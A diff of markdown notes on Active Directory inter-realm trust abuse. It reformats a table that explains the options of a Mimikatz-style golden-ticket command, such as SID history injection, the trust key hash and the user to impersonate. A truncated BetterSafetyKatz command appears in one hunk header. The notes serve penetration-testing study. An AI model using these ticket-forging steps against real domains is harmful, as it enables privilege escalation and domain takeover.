@@ -2,8 +2,7 @@
 
 ## Trust Flow
 
-The Diagram below shows how Client from trusted domain can ask for access to other Domain's service.\
-
+The Diagram below shows how Client from trusted domain can ask for access to other Domain's service.\\
 
 We can see that in order to allow access to the service hosted on Domain B, a TGT is returned within a TGS-REP signed with the Inter-Realm Trust Key.
 
@@ -43,23 +42,32 @@ C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:d
 | Options                            |                                                  |
 | ---------------------------------- | ------------------------------------------------ |
 | <pre><code>/domain:
-</code></pre>  | FQDN of the current domain                       |
+</code></pre>  |                                                  |
+|                                    | FQDN of the current domain                       |
 | <pre><code>/sid:
-</code></pre>     | SID of the current domain                        |
+</code></pre>     |                                                  |
+|                                    | SID of the current domain                        |
 | <pre><code>/sids
-</code></pre>     | SID to be injected to the SID history            |
+</code></pre>     |                                                  |
+|                                    | SID to be injected to the SID history            |
 | <pre><code>/rc4:
-</code></pre>     | RC4 of the trust key                             |
+</code></pre>     |                                                  |
+|                                    | RC4 of the trust key                             |
 | <pre><code>/krbtgt:
-</code></pre>  | krbtgt hash can be used instead of the Trust Key |
+</code></pre>  |                                                  |
+|                                    | krbtgt hash can be used instead of the Trust Key |
 | <pre><code>/user:
-</code></pre>    | User to impersonate                              |
+</code></pre>    |                                                  |
+|                                    | User to impersonate                              |
 | <pre><code>/service:
-</code></pre> | Target service in the parent domain              |
+</code></pre> |                                                  |
+|                                    | Target service in the parent domain              |
 | <pre><code>/target:
-</code></pre>  | FQDN of the parent domain                        |
+</code></pre>  |                                                  |
+|                                    | FQDN of the parent domain                        |
 | <pre><code>/ticket
-</code></pre>   | Path to save the ticket                          |
+</code></pre>   |                                                  |
+|                                    | Path to save the ticket                          |
 
 ### Request the TGS and pass it
 
